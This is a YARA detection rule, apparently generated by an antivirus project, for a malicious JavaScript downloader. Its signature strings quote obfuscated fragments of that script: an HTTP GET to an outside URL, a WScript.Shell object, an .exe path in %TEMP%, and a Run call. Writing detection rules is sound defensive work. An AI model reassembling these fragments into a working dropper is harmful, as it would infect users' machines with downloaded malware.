rule sig_20160401_722c9709142c1016ca694bb655cb03cf {
  meta:
    description = "datamaliciousorder - file 20160401_722c9709142c1016ca694bb655cb03cf.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "7fe7e84ada92050db9394edfa4cc24a56db8c3aa8125c152cf9d022591013679"

  strings:
    $s1  = "JdYjk[CvOni](\"G\" + \"ET\", \"http://abnregistrationaustralia.com.au/k38sa\", false);" fullword ascii
    $s2  = "var LfaPzz = function SlsDpt() {return WScript[VzkQvu](\"WScript\"+\".Shell\");}(), PyWz = 11;" fullword ascii
    $s3  = "function FsaUia(PtxVbl, KvfRhv){BbrZyy = BbrZyy * 1; return PtxVbl - KvfRhv;};" fullword ascii
    $s4  = "if (JdYjk[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function DlgIvw() {return LfaPzz[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"uSpE4su5ecB.ex\" + \"e\";};" fullword ascii
    $s6  = "function FcsGbk(){return ZlXh + \"\";};" fullword ascii
    $s7  = "function UnGpe() {return ((KyfRvt == true) && (KyfRvt == HtEp)) ? 1 : BbrZyy;};" fullword ascii
    $s8  = "function NsQye(BpCh) {var HwWz = (1, 2, 3, 4, 5, BpCh); return HwWz;};" fullword ascii
    $s9  = "var FtFn = false;" fullword ascii
    $s10 = "function XnOl(){return 23;};" fullword ascii
    $s11 = "HtEp = true; " fullword ascii
    $s12 = "}while (BaXvs);" fullword ascii
    $s13 = "var AufFs = new this[\"Date\"]();" fullword ascii
    $s14 = "var KyfRvt = false;" fullword ascii
    $s15 = "function MhaNt(){return VzkQvu;};" fullword ascii
    $s16 = "function RqWmf()" fullword ascii
    $s17 = "return FsaUia(LbVyk, TzuHf);" fullword ascii
    $s18 = "function GiPa(VuDb){LfaPzz[\"R\"+\"un\"](VuDb, BbrZyy, BbrZyy);};" fullword ascii
    $s19 = "var HtEp = false;" fullword ascii
    $s20 = "KyfRvt = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}